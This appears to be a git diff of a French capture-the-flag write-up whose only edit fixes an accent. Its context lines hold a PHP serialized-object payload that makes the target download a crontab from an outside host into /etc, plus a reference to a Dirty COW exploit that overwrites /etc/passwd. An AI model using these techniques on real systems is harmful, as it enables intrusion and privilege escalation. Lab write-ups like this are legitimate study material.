@@ -596,7 +596,7 @@ L'exploitation semble on ne peut plus facile : on écrit un script qui instancie
 O:4:"Test":3:{s:3:"url";s:33:"http://192.168.2.240:8000/crontab";s:9:"name_file";s:7:"crontab";s:4:"path";s:4:"/etc";}
 ```
 
-Sauf que ça ne marche pas... WTF ! Evidemment ça fonctionne sur des tests locaux... Mais il semble que d'autres ont eu des problèmes avec cette VM (espace disque insuffisant, etc).  
+Sauf que ça ne marche pas... WTF ! Évidemment ça fonctionne sur des tests locaux... Mais il semble que d'autres ont eu des problèmes avec cette VM (espace disque insuffisant, etc).  
 
 Finalement j'ai utilisé [l'exploit de FireFart](https://github.com/FireFart/dirtycow/blob/master/dirty.c) pour [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) qui édite le fichier */etc/passwd* pour remplacer root par un utilisateur *firefart* avec un mot de passe de notre choix :  
 
